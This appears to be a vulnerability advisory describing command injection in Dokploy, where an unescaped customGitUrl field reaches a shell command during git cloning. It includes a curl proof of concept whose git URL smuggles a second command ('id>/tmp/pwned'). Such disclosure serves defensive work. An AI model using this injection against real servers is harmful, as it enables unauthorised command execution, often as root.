repo.description:
## Summary

Dokploy has a command injection vulnerability in the custom git clone flow. The `customGitUrl` field is interpolated directly into a shell command string without escaping in `cloneGitRepository()`, allowing an authenticated user to execute arbitrary OS commands by providing a malicious git URL and triggering a deployment.


## Proof of Concept
```bash
# Update application with injected git URL
curl -X POST "http://TARGET/api/trpc/application.update" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{
    "json": {
      "applicationId": "APP_ID",
      "sourceType": "git",
      "customGitUrl": "https://github.com/example/repo.git;id>/tmp/pwned;",
      "customGitBranch": "main"
    }
  }'

## Impact
- Execute arbitrary OS commands as the Dokploy server process user (often root)
repo.summary: Command Injection via Unescaped Git URL in Clone Commands
